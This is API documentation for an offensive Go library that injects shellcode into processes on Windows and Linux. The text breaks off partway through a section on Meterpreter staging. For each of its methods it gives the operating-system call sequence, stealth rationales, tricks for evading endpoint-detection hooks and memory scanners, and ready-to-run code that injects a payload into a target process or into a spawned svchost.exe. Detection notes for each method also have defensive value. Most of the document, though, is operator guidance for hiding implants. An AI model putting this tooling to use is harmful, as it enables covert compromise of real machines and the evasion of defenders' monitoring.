[← Back to README](../README.md)

# Process Injection (`inject`)

MITRE ATT&CK: **T1055 — Process Injection**

The `inject` package provides a unified API for shellcode injection across Windows and Linux.
It supports 15 injection methods, automatic fallback chains, shellcode validation, and
optional EDR bypass via direct/indirect syscalls on Windows.

---

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Quick Reference Table](#quick-reference-table)
- [Core Types](#core-types)
  - [Method Constants](#method-constants)
  - [Config](#config)
  - [Injector Interface](#injector-interface)
- [Configuration and Validation](#configuration-and-validation)
  - [Config.Validate](#configvalidate)
  - [ValidateMethod](#validatemethod)
  - [AvailableMethods](#availablemethods)
  - [DefaultMethod / DefaultMethodForStage](#defaultmethod--defaultmethodforstage)
  - [NewInjector](#newinjector)
- [Windows Methods](#windows-methods)
  - [CreateRemoteThread (crt)](#createremotethread-crt)
  - [CreateThread (ct)](#createthread-ct)
  - [QueueUserAPC (apc)](#queueuserapc-apc)
  - [Early Bird APC (earlybird)](#early-bird-apc-earlybird)
  - [Thread Execution Hijacking (threadhijack)](#thread-execution-hijacking-threadhijack)
  - [RtlCreateUserThread (rtl)](#rtlcreateuserthread-rtl)
  - [DirectSyscall (syscall)](#directsyscall-syscall)
  - [CreateFiber (fiber)](#createfiber-fiber)
  - [EtwpCreateEtwThread (etwthr)](#etwpcreateetwthread-etwthr)
  - [NtQueueApcThreadEx (apcex)](#ntqueueapcthreadex-apcex)
- [Linux Methods](#linux-methods)
  - [Ptrace (ptrace)](#ptrace-ptrace)
  - [MemFD (memfd)](#memfd-memfd)
  - [ProcMem / mmap (procmem)](#procmem--mmap-procmem)
- [PureGo Methods (Linux/macOS, no CGO)](#purego-methods-linuxmacos-no-cgo)
  - [InjectPureGo](#injectpurego)
  - [InjectPureGoAsync](#injectpuregoasync)
- [Meterpreter Staging](#meterpreter-staging)
  - [InjectMeterpreterWindows](#injectmeterpreterwindows)
  - [InjectMeterpreterWrapper (Unix)](#injectmeterpreterWrapper-unix)
- [Windows Syscall Bypass (EDR Evasion)](#windows-syscall-bypass-edr-evasion)
  - [WindowsConfig](#windowsconfig)
  - [DefaultWindowsConfig](#defaultwindowsconfig)
  - [NewWindowsInjector](#newwindowsinjector)
  - [windowsSyscallInjector internals](#windowssyscallinjector-internals)
- [Fallback System](#fallback-system)
  - [FallbackChain](#fallbackchain)
  - [InjectWithFallback](#injectwithfallback)
- [Shellcode Utilities](#shellcode-utilities)
  - [Read](#read)
  - [Validate](#validate)
- [Stats / Telemetry](#stats--telemetry)
  - [NewStats / Finish / Print](#newstats--finish--print)

---

## Architecture Overview

```
                     ┌─────────────┐
                     │   Config    │   Method, PID, ProcessPath, Fallback
                     └──────┬──────┘
                            │
            ┌───────────────┼───────────────┐
            v               v               v
   ┌────────────────┐  ┌──────────┐  ┌──────────────────┐
   │ NewInjector()  │  │Fallback  │  │NewWindowsInjector│
   │ (standard API) │  │Chain     │  │(syscall bypass)  │
   └───────┬────────┘  └──────────┘  └────────┬─────────┘
           │                                   │
           v                                   v
   ┌────────────────┐              ┌───────────────────────┐
   │windowsInjector │              │windowsSyscallInjector  │
   │ linuxInjector  │              │  routes NT calls via   │
   │                │              │  wsyscall.Caller       │
   └────────────────┘              └───────────────────────┘
```

All injection methods implement the `Injector` interface. On Windows, you can choose between
standard WinAPI calls (via `NewInjector`) or EDR-bypassing NT syscalls (via `NewWindowsInjector`
with `SyscallMethod` set to `MethodDirect` or `MethodIndirect`).

---

## Quick Reference Table

| Method | Constant | Platform | Remote | Caller Support | MITRE Sub-technique |
|--------|----------|----------|--------|----------------|---------------------|
| CreateRemoteThread | `MethodCreateRemoteThread` (`"crt"`) | Windows | Yes (PID) | Yes | T1055.002 |
| CreateThread (self) | `MethodCreateThread` (`"ct"`) | Windows | No (self) | Yes | T1055.002 |
| QueueUserAPC | `MethodQueueUserAPC` (`"apc"`) | Windows | Yes (PID) | Yes | T1055.004 |
| Early Bird APC | `MethodEarlyBirdAPC` (`"earlybird"`) | Windows | Spawned process | Yes | T1055.004 |
| Thread Hijacking | `MethodThreadHijack` (`"threadhijack"`) | Windows | Spawned process | Yes | T1055.003 |
| RtlCreateUserThread | `MethodRtlCreateUserThread` (`"rtl"`) | Windows | Yes (PID) | Yes | T1055.002 |
| Direct Syscall | `MethodDirectSyscall` (`"syscall"`) | Windows | No (self) | N/A (deprecated) | T1106 |
| CreateFiber | `MethodCreateFiber` (`"fiber"`) | Windows | No (self) | Yes | T1055.013 |
| EtwpCreateEtwThread | `MethodEtwpCreateEtwThread` (`"etwthr"`) | Windows | No (self) | Yes | T1055 |
| NtQueueApcThreadEx | `MethodNtQueueApcThreadEx` (`"apcex"`) | Windows | Yes (PID) | Yes | T1055 |
| Ptrace | `MethodPtrace` (`"ptrace"`) | Linux x64 | Yes (PID) | N/A | T1055.008 |
| MemFD | `MethodMemFD` (`"memfd"`) | Linux x64 | No (fork) | N/A | T1620 |
| ProcMem (mmap) | `MethodProcMem` (`"procmem"`) | Linux x64 | No (self) | N/A | T1055 |
| PureGo Shellcode | `MethodPureGoShellcode` (`"purego"`) | Linux/macOS | No (self) | N/A | T1055 |
| PureGo Meterpreter | `MethodPureGoMeterpreter` (`"purego-meter"`) | Linux/macOS | No (self) | N/A | T1055 |

---

## Core Types

### Method Constants

`Method` is a `string` type. Each constant maps to a short identifier used internally:

```go
// Windows
inject.MethodCreateRemoteThread  // "crt"
inject.MethodCreateThread        // "ct"
inject.MethodQueueUserAPC        // "apc"
inject.MethodEarlyBirdAPC        // "earlybird"
inject.MethodThreadHijack        // "threadhijack"
inject.MethodRtlCreateUserThread // "rtl"
inject.MethodDirectSyscall       // "syscall"
inject.MethodCreateFiber         // "fiber"
inject.MethodEtwpCreateEtwThread // "etwthr"
inject.MethodNtQueueApcThreadEx  // "apcex"

// MethodProcessHollowing is a deprecated alias for MethodThreadHijack.
// The implementation is Thread Execution Hijacking (T1055.003), not PE hollowing.
inject.MethodProcessHollowing    // == MethodThreadHijack

// Linux
inject.MethodPtrace              // "ptrace"
inject.MethodMemFD               // "memfd"
inject.MethodProcMem             // "procmem"

// PureGo (Linux/macOS, no CGO)
inject.MethodPureGoShellcode     // "purego"
inject.MethodPureGoMeterpreter   // "purego-meter"
```

### Config

```go
type Config struct {
    Method      Method // injection technique to use
    PID         int    // target PID (0 = self for procmem/ct/purego)
    ProcessPath string // path to spawn (earlybird, threadhijack)
    Fallback    bool   // try alternate methods on failure
}
```

**Field details:**

| Field | Purpose | Required by |
|-------|---------|-------------|
| `Method` | Which injection technique to use. Must be valid for the current OS. | All |
| `PID` | Target process ID. Required for remote injection methods (crt, apc, rtl, ptrace). Zero means self-injection. | crt, apc, rtl, ptrace |
| `ProcessPath` | Path to a legitimate executable to spawn in suspended state. Required for techniques that create a child process. Defaults to `notepad.exe` if empty for earlybird/threadhijack. | earlybird, threadhijack |
| `Fallback` | When true, `InjectWithFallback` tries alternate methods from the fallback chain. | Optional |

### Injector Interface

```go
type Injector interface {
    Inject(shellcode []byte) error
}
```

Every injection method implements this single-method interface. Create one via `NewInjector`
(standard) or `NewWindowsInjector` (syscall bypass).

---

## Configuration and Validation

### Config.Validate

```go
func (c *Config) Validate() error
```

Validates the entire configuration. Checks that:
1. The method is valid for the current platform (delegates to `ValidateMethod`).
2. Remote methods (`crt`, `apc`, `rtl`, `ptrace`) have a non-zero PID or a ProcessPath.
3. Spawned-process methods (`earlybird`, `threadhijack`) have a ProcessPath.

```go
cfg := &inject.Config{Method: inject.MethodCreateRemoteThread, PID: 0}
err := cfg.Validate() // error: "method 'crt' requires a valid PID or process name/path"
```

### ValidateMethod

```go
func ValidateMethod(method Method) error
```

Checks that a single method string is valid on the current GOOS/GOARCH. Returns nil on
success or an error listing the available methods.

### AvailableMethods

```go
func AvailableMethods() []Method
```

Returns all methods available on the current platform. On Windows, returns the 8 Windows
methods. On Linux, returns ptrace, memfd, procmem, purego, and purego-meter.

### DefaultMethod / DefaultMethodForStage

```go
func DefaultMethod() Method      // Windows: crt, Linux: ptrace
func DefaultMethodForStage() Method // Windows: ct, Linux: procmem
```

`DefaultMethod` returns the best general-purpose method (remote injection).
`DefaultMethodForStage` returns the best method for staging payloads into the current process
(self-injection), which avoids the overhead and permissions of opening another process.

### NewInjector

```go
func NewInjector(cfg *Config) (Injector, error)
```

Creates a platform-specific injector from a `Config`. On Windows this returns a
`windowsInjector` that uses standard WinAPI calls. On Linux it returns a `linuxInjector`.

```go
cfg := &inject.Config{
    Method: inject.MethodCreateRemoteThread,
    PID:    4321,
}
injector, err := inject.NewInjector(cfg)
if err != nil {
    log.Fatal(err)
}
err = injector.Inject(shellcode)
```

---

## Windows Methods

All Windows methods follow a common memory pattern:

1. **Allocate** memory with `PAGE_READWRITE` (not RWX -- avoids an obvious detection signal).
2. **Write** shellcode into the allocated region.
3. **Protect** the region to `PAGE_EXECUTE_READ` (W^X transition).
4. **Execute** via thread creation, APC queueing, fiber switching, or context hijacking.

### CreateRemoteThread (crt)

**MITRE:** T1055.002 -- Thread Execution Hijacking

**OS-level operation:**
1. `OpenProcess` with `PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ`
2. `VirtualAllocEx` (PAGE_READWRITE) in the target process
3. `WriteProcessMemory` to copy shellcode
4. `VirtualProtectEx` to PAGE_EXECUTE_READ
5. `CreateRemoteThread` (or `NtCreateThreadEx` via Caller) pointed at the shellcode

**Why choose this method:**
The most straightforward remote injection technique. Works against any process you have
sufficient privileges to open. Good baseline when stealth is not the primary concern.

**Advantages:**
- Simple, well-understood, reliable
- Works against any accessible process
- Full Caller support for EDR bypass

**Disadvantages:**
- Heavily monitored by every EDR product on the market
- `CreateRemoteThread` into a foreign process is a high-confidence indicator of injection
- Requires `PROCESS_CREATE_THREAD` access, which some protected processes deny

**Remote injection:** Yes (requires PID)
**Caller support:** Yes

**Detection characteristics:**
- ETW: `Microsoft-Windows-Kernel-Process` event for cross-process thread creation
- Userland hooks: `ntdll!NtCreateThreadEx`, `kernel32!CreateRemoteThread`
- Cross-process `VirtualAllocEx` + `WriteProcessMemory` is a textbook detection signature

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodCreateRemoteThread,
    PID:    1234,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

### CreateThread (ct)

**MITRE:** T1055.002

**OS-level operation:**
1. XOR-encode the shellcode with a random key (memory scan evasion)
2. `VirtualAlloc` with PAGE_READWRITE in the current process
3. `RtlMoveMemory` to copy the encoded shellcode
4. CPU-bound delay loop (temporal evasion -- avoids `Sleep` API hooks)
5. XOR-decode the shellcode in place
6. `VirtualProtect` to PAGE_EXECUTE_READ
7. `NtCreateThreadEx` (via ntdll, not kernel32) to start execution
8. `WaitForSingleObject` with 100ms timeout

**Why choose this method:**
Best choice for self-injection / staging. The built-in XOR encoding defeats static memory
scanners that look for known shellcode signatures. The CPU delay loop replaces `Sleep`
calls, which EDR products hook to detect sandbox evasion.

**Advantages:**
- No cross-process operations (no OpenProcess, no remote memory writes)
- Built-in XOR evasion layer
- Uses `NtCreateThreadEx` instead of `CreateThread` (slightly stealthier)
- CPU delay avoids Sleep hook detection
- Full Caller support

**Disadvantages:**
- Self-injection only -- the shellcode runs in your own process
- RWX or RW->RX transitions in a process can still be detected
- If the process crashes, your implant dies with it

**Remote injection:** No (self only)
**Caller support:** Yes

**Detection characteristics:**
- Memory scan: XOR encoding defeats signature-based scanners but not entropy analysis
- ETW: Thread creation in own process is less suspicious than cross-process
- The RW -> RX `VirtualProtect` transition is a known indicator

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodCreateThread,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

### QueueUserAPC (apc)

**MITRE:** T1055.004 -- Asynchronous Procedure Call

**OS-level operation:**
1. `OpenProcess` with `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ`
2. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx` in the target
3. Enumerate all threads of the target process via `CreateToolhelp32Snapshot`
4. For each thread: `OpenThread`, `SuspendThread`, `QueueUserAPC`, `ResumeThread`
5. APC executes when the target thread enters an alertable wait state

**Why choose this method:**
Does not create a new thread in the target process. Instead, it queues a callback on an
existing thread, which is less conspicuous. Good for injecting into processes that
regularly enter alertable wait states (most GUI applications).

**Advantages:**
- No new thread created in the target process
- Less monitored than CreateRemoteThread
- Iterates all threads to maximize delivery chance
- Full Caller support

**Disadvantages:**
- Target thread must enter an alertable wait state (`SleepEx`, `WaitForSingleObjectEx`, etc.)
- If no thread becomes alertable, the APC never fires
- Multiple APC queues across threads can look suspicious
- Requires knowing the target PID

**Remote injection:** Yes (requires PID)
**Caller support:** Yes

**Detection characteristics:**
- ETW: `NtQueueApcThread` events
- Behavioral: Cross-process APC + memory allocation is monitored
- Heuristic: Multiple threads being suspended/resumed in quick succession

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodQueueUserAPC,
    PID:    1234,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

### Early Bird APC (earlybird)

**MITRE:** T1055.004 -- Asynchronous Procedure Call

**OS-level operation:**
1. `CreateProcess` with `CREATE_SUSPENDED` flag (spawns a legitimate process in suspended state)
2. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx` in the new process
3. `QueueUserAPC` on the main thread of the suspended process
4. `ResumeThread` -- the APC fires before any application code runs

**Why choose this method:**
The "early bird" variant is one of the stealthiest APC techniques. Because the APC is
queued before the process has initialized, the shellcode runs before any EDR DLLs are
loaded into the child process. This gives you a window to execute before hooks are installed.

**Advantages:**
- Shellcode executes before EDR hooks are loaded in the child process
- Process appears as a legitimate application (notepad.exe, svchost.exe, etc.)
- Guaranteed APC delivery (the suspended main thread is always alertable on resume)
- Full Caller support

**Disadvantages:**
- Creates a new child process (visible in process tree)
- The suspended-then-immediately-resumed pattern is a known detection signal
- If the chosen host process exits quickly, the shellcode may be killed
- Requires a ProcessPath (defaults to `notepad.exe`)

**Remote injection:** Spawned child process
**Caller support:** Yes

**Detection characteristics:**
- ETW: `CREATE_SUSPENDED` process creation followed by APC queue is a high-confidence signal
- Process tree: unexpected child process relationships
- Timing: process created -> suspended -> APC queued -> resumed in rapid succession

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method:      inject.MethodEarlyBirdAPC,
    ProcessPath: `C:\Windows\System32\svchost.exe`,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

### Thread Execution Hijacking (threadhijack)

**MITRE:** T1055.003 -- Thread Execution Hijacking

**OS-level operation:**
1. `CreateProcess` with `CREATE_SUSPENDED`
2. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx` in the new process
3. `GetThreadContext` to read the current register state (including RIP)
4. Overwrite `RIP` (instruction pointer) with the shellcode address
5. `SetThreadContext` to apply the modified registers
6. `ResumeThread` -- the thread resumes execution directly at the shellcode

**Why choose this method:**
No new thread, no APC queue. The existing thread is simply redirected to execute your
shellcode. This is harder to detect because there is no thread creation event and no
APC event. The only signal is a `SetThreadContext` call, which is less commonly monitored.

**Advantages:**
- No thread creation, no APC -- minimizes observable events
- Context manipulation is less commonly hooked than thread/APC APIs
- Full Caller support (routes NtGetContextThread/NtSetContextThread through Caller)

**Disadvantages:**
- x64 only (manipulates CONTEXT structure directly)
- Spawns a child process (same visibility concern as earlybird)
- The original thread's execution is destroyed (it never runs its intended code)
- Requires a ProcessPath

**Remote injection:** Spawned child process
**Caller support:** Yes

**Detection characteristics:**
- ETW: `SetThreadContext` on a remote process is rare and suspicious
- Behavioral: suspended process with modified thread context
- Memory forensics: RIP pointing to a non-image-backed memory region

> **Note:** `MethodProcessHollowing` is a deprecated alias for `MethodThreadHijack`. The
> implementation is Thread Execution Hijacking (T1055.003), not PE hollowing (T1055.012).

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method:      inject.MethodThreadHijack,
    ProcessPath: `C:\Windows\System32\notepad.exe`,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

### RtlCreateUserThread (rtl)

**MITRE:** T1055.002

**OS-level operation:**
1. `OpenProcess` with `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD`
2. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx` in the target
3. `RtlCreateUserThread` (undocumented ntdll export) to create a thread in the target process

**Why choose this method:**
`RtlCreateUserThread` is a lower-level alternative to `CreateRemoteThread` that lives in
ntdll.dll. Some older EDR products only hook the kernel32 `CreateRemoteThread` wrapper and
miss calls going directly through ntdll. While modern EDRs hook both, this method provides
a useful fallback when CRT is blocked.

**Advantages:**
- Bypasses kernel32-level hooks (only relevant against older EDR)
- Undocumented API -- less commonly instrumented historically
- Full Caller support (when using Caller, routes through NtCreateThreadEx instead)

**Disadvantages:**
- Still creates a new thread in the target process
- Modern EDRs hook at the ntdll or syscall level, negating the advantage
- Undocumented API may change across Windows versions

**Remote injection:** Yes (requires PID)
**Caller support:** Yes (remapped to NtCreateThreadEx)

**Detection characteristics:**
- Same as CreateRemoteThread from a kernel perspective
- ETW still reports the cross-process thread creation

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodRtlCreateUserThread,
    PID:    1234,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

### DirectSyscall (syscall)

**MITRE:** T1106 -- Native API

**Status:** Deprecated in the standard injector. The legacy path has been removed.
Use `NewWindowsInjector` with `SyscallMethod: wsyscall.MethodDirect` instead.

**Why it existed:**
The original DirectSyscall method attempted to invoke NT syscalls directly, bypassing
all userland hooks. This has been superseded by the `WindowsConfig` / `Caller` system,
which provides the same capability in a composable way across all injection methods.

**How to migrate:**
```go
// Old (returns error):
cfg := &inject.Config{Method: inject.MethodDirectSyscall}

// New (works):
cfg := &inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodCreateThread},
    SyscallMethod: wsyscall.MethodDirect,
}
injector, _ := inject.NewWindowsInjector(cfg)
```

---

### CreateFiber (fiber)

**MITRE:** T1055.013 -- Process Hollowing (fiber variant)

**OS-level operation:**
1. `VirtualAlloc` (PAGE_READWRITE) + `RtlMoveMemory` + `VirtualProtect` (PAGE_EXECUTE_READ)
2. `ConvertThreadToFiber` to convert the current thread into a fiber
3. `CreateFiber` with the shellcode address as the fiber start routine
4. `SwitchToFiber` to transfer execution to the shellcode fiber

**Why choose this method:**
Fiber-based execution does not create a new thread. Fibers are user-mode cooperative
multitasking primitives that are scheduled by the application, not the kernel. This means
there is no kernel-level thread creation event. Some EDR products do not monitor fiber APIs.

**Advantages:**
- No thread creation event at the kernel level
- Fiber APIs are less commonly hooked
- Runs in the current thread context (no cross-process operations)
- Full Caller support for memory allocation

**Disadvantages:**
- Self-injection only
- Calling `SwitchToFiber` transfers control completely -- no return until the shellcode finishes
- Converting the main thread to a fiber can cause issues if the application uses thread-local storage
- Fiber-based execution is increasingly flagged by modern EDR

**Remote injection:** No (self only)
**Caller support:** Yes (for memory allocation; fiber APIs themselves go through kernel32)

**Detection characteristics:**
- `ConvertThreadToFiber` + `CreateFiber` + `SwitchToFiber` sequence is rare in legitimate software
- Memory scan: RW->RX transition followed by fiber creation

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodCreateFiber,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

### EtwpCreateEtwThread (etwthr)

**MITRE:** T1055 -- Process Injection

**OS-level operation:**
1. `VirtualAlloc` (PAGE_READWRITE) in the current process
2. Copy shellcode into the allocated region
3. `VirtualProtect` to PAGE_EXECUTE_READ
4. Call `ntdll!EtwpCreateEtwThread(addr, 0)` -- an internal ETW helper that creates a thread at the given address

**Why choose this method:**
`EtwpCreateEtwThread` is an internal, undocumented function in `ntdll.dll` used by the ETW subsystem to create worker threads. Because it is not part of the standard thread creation API surface (`CreateThread`, `CreateRemoteThread`, `NtCreateThreadEx`), most EDR products do not hook or monitor it. This makes it an effective evasion technique for self-injection.

**Advantages:**
- Bypasses monitoring on standard thread creation APIs (CreateThread, NtCreateThreadEx)
- Internal ntdll function -- not part of the documented API surface
- Self-injection with minimal observable events
- Full Caller support (memory allocation via NtAllocateVirtualMemory/NtProtectVirtualMemory)

**Disadvantages:**
- Internal API -- may change or be removed between Windows versions
- Self-injection only (no cross-process variant)
- The function name is known to some advanced EDR products
- RW -> RX memory transition is still observable

**Remote injection:** No (self only)
**Caller support:** Yes (for memory allocation; thread creation routed through Caller on windowsSyscallInjector)

**Detection characteristics:**
- Memory scan: RW->RX transition followed by thread creation from ntdll internal function
- Advanced EDR: monitoring of EtwpCreateEtwThread as a known evasion vector
- Behavioral: thread start address in non-image-backed memory

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodEtwpCreateEtwThread,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

With Caller for EDR bypass:
```go
cfg := &inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodEtwpCreateEtwThread},
    SyscallMethod: wsyscall.MethodIndirect,
}
injector, _ := inject.NewWindowsInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

### NtQueueApcThreadEx (apcex)

**MITRE:** T1055 -- Process Injection

**OS-level operation:**
1. `OpenProcess` with `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ`
2. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx` in the target
3. Enumerate all threads of the target process via `CreateToolhelp32Snapshot`
4. For each thread: `OpenThread`, call `NtQueueApcThreadEx(hThread, 1, addr, 0, 0, 0)`
5. Flag `1` = `QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC` -- forces immediate APC delivery

**Why choose this method:**
Standard APC injection (`QueueUserAPC`) requires the target thread to enter an alertable wait state before the APC fires. `NtQueueApcThreadEx` with the `QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC` flag (available since Windows 10 1903) forces immediate APC delivery regardless of the thread's wait state. This makes APC injection significantly more reliable.

**Advantages:**
- APC fires immediately -- no alertable wait required
- More reliable than standard QueueUserAPC
- No new thread created in the target process
- Full Caller support (memory + APC call routed through syscall Caller)

**Disadvantages:**
- Requires Windows 10 1903+ (the special APC flag is not available on older versions)
- Still requires cross-process memory allocation and write
- `NtQueueApcThreadEx` is increasingly monitored by modern EDR products
- Requires knowing the target PID

**Remote injection:** Yes (requires PID)
**Caller support:** Yes

**Detection characteristics:**
- ETW: `NtQueueApcThreadEx` with special APC flag
- Behavioral: cross-process APC + memory allocation pattern
- The special APC flag usage is a known indicator of malicious activity

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodNtQueueApcThreadEx,
    PID:    1234,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

With Caller for EDR bypass:
```go
cfg := &inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodNtQueueApcThreadEx, PID: 1234},
    SyscallMethod: wsyscall.MethodDirect,
}
injector, _ := inject.NewWindowsInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

## Linux Methods

### Ptrace (ptrace)

**MITRE:** T1055.008 -- Ptrace System Call

**OS-level operation:**
1. `PTRACE_ATTACH` to the target process (stops it with SIGSTOP)
2. `Wait4` until the process is in stopped state
3. `PTRACE_GETREGS` to read the current register state
4. Calculate a stack-aligned address below RSP with 128-byte red zone clearance
5. Write shellcode 8 bytes at a time via `PTRACE_POKEDATA`
6. Set `RIP` to the shellcode address, adjust `RSP`
7. `PTRACE_SETREGS` to apply the new registers
8. `PTRACE_CONT` to resume execution at the shellcode

**Why choose this method:**
The standard Linux mechanism for process debugging and injection. Does not require any
special kernel modules. Works on any process you have permission to ptrace.

**Advantages:**
- No file on disk (shellcode written directly to process memory)
- No need to allocate new memory regions (uses existing stack space)
- Standard kernel API, available on all Linux systems

**Disadvantages:**
- `ptrace_scope` sysctl may restrict ptrace to child processes only (`/proc/sys/kernel/yama/ptrace_scope`)
- Requires `CAP_SYS_PTRACE` or root for non-child processes
- The target process is stopped during injection (observable side effect)
- Only works on x86_64 (manipulates x64 registers directly)

**Remote injection:** Yes (requires PID)
**Caller support:** N/A (Linux)

**Detection characteristics:**
- `PTRACE_ATTACH` generates an audit event
- `/proc/<pid>/status` shows `TracerPid` while attached
- Security modules (AppArmor, SELinux) can block ptrace

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodPtrace,
    PID:    1234,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

### MemFD (memfd)

**MITRE:** T1620 -- Reflective Code Loading

**OS-level operation:**
1. `memfd_create` (syscall 319) to create an anonymous in-memory file descriptor
2. `write` the shellcode (treated as an ELF binary) to the memfd
3. `chmod` the fd path (`/proc/self/fd/<n>`) to 0755
4. `ForkExec` the memfd path as a new process with `Setsid: true`

**Why choose this method:**
Fileless execution. The payload never touches disk. The memfd appears as an anonymous
file descriptor, making it harder to attribute to a specific file. Best for executing
complete ELF binaries (not raw shellcode).

**Advantages:**
- No file on disk (truly fileless)
- The executed binary appears to run from `/proc/self/fd/<n>`, which is hard to trace
- Works with full ELF binaries, not just raw shellcode
- Kernel 3.17+ support (available on all modern distros)

**Disadvantages:**
- The payload must be a valid ELF executable (not raw position-independent shellcode)
- Creates a new child process (visible in process tree)
- `/proc/<pid>/exe` symlink points to the memfd, which some detection tools check
- `memfd_create` usage is itself a detection signal on security-aware systems

**Remote injection:** No (forks a new process)
**Caller support:** N/A (Linux)

**Detection characteristics:**
- `memfd_create` syscall is logged by auditd
- `/proc/<pid>/exe` pointing to `/memfd:` is a strong indicator
- eBPF-based tools can trace the syscall

```go
elfBinary, _ := inject.Read("implant.elf")

cfg := &inject.Config{
    Method: inject.MethodMemFD,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(elfBinary); err != nil {
    log.Fatal(err)
}
```

---

### ProcMem / mmap (procmem)

**MITRE:** T1055

**OS-level operation:**
1. `mmap` an anonymous region with `PROT_READ | PROT_WRITE | PROT_EXEC` + `MAP_ANONYMOUS | MAP_PRIVATE`
2. Copy shellcode into the mapped region
3. Cast the region address to a function pointer
4. Execute in a new goroutine with `runtime.LockOSThread`

**Why choose this method:**
The simplest self-injection method on Linux. No ptrace, no memfd, no child process.
Just allocate RWX memory, copy shellcode, and jump to it. Best for staging payloads
in the current process.

**Advantages:**
- Simplest possible injection (mmap + copy + call)
- No child process, no ptrace, no special privileges
- Works on any Linux system
- `DefaultMethodForStage()` returns this on Linux

**Disadvantages:**
- Self-injection only
- RWX memory allocation is a detection signal
- The shellcode runs in a goroutine, which means Go runtime state may interfere
- If the shellcode crashes, the entire process dies

**Remote injection:** No (self only)
**Caller support:** N/A (Linux)

**Detection characteristics:**
- `mmap` with `PROT_EXEC` + `MAP_ANONYMOUS` is a well-known indicator
- `/proc/<pid>/maps` will show an anonymous RWX region

```go
shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodProcMem,
}
injector, _ := inject.NewInjector(cfg)
if err := injector.Inject(shellcode); err != nil {
    log.Fatal(err)
}
```

---

## PureGo Methods (Linux/macOS, no CGO)

These methods use `github.com/ebitengine/purego` to call shellcode as a function pointer
without requiring CGO. Build with `CGO_ENABLED=0` and these still work.

### InjectPureGo

```go
func InjectPureGo(shellcode []byte) error
```

Executes shellcode synchronously. Blocks until the shellcode returns.

**OS-level operation:**
1. `mmap` (RWX, anonymous, private) via `golang.org/x/sys/unix`
2. Copy shellcode into the mapped region
3. Spawn a goroutine with `runtime.LockOSThread`
4. Call `purego.SyscallN(fnptr)` to invoke the shellcode as a C function
5. `munmap` on return (deferred)

**Why choose this method:**
When you need to build a fully static Go binary with `CGO_ENABLED=0` and still execute
shellcode. The purego library uses assembly trampolines to call arbitrary function pointers
without CGO.

**Advantages:**
- Works with `CGO_ENABLED=0` (fully static binary)
- Clean memory management (munmap on return)
- Blocks until shellcode completes (safe to use return value)

**Disadvantages:**
- Blocking -- caller must handle concurrency if needed
- RWX memory is detectable
- Linux/macOS only

```go
shellcode, _ := inject.Read("payload.bin")
if err := inject.InjectPureGo(shellcode); err != nil {
    log.Fatal(err)
}
```

### InjectPureGoAsync

```go
func InjectPureGoAsync(shellcode []byte) error
```

Same as `InjectPureGo` but returns immediately. The shellcode runs in a background
goroutine. Memory is not freed (it lives until process exit) because the shellcode
may still be executing.

```go
shellcode, _ := inject.Read("payload.bin")
if err := inject.InjectPureGoAsync(shellcode); err != nil {
    log.Fatal(err)
}
// Shellcode is running in the background, continue with other work.
```

---

## Meterpreter Staging

### InjectMeterpreterWindows

```go
func InjectMeterpreterWindows(stage []byte, caller *wsyscall.Caller) error
```

Executes a Meterpreter stage in memory on Windows. This is the function you call after
receiving the stage payload from a Metasploit handler.

**OS-level operation:**
1. `VirtualAlloc` (or `NtAllocateVirtualMemory` via Caller) with PAGE_READWRITE
2. `RtlMoveMemory` to copy the stage
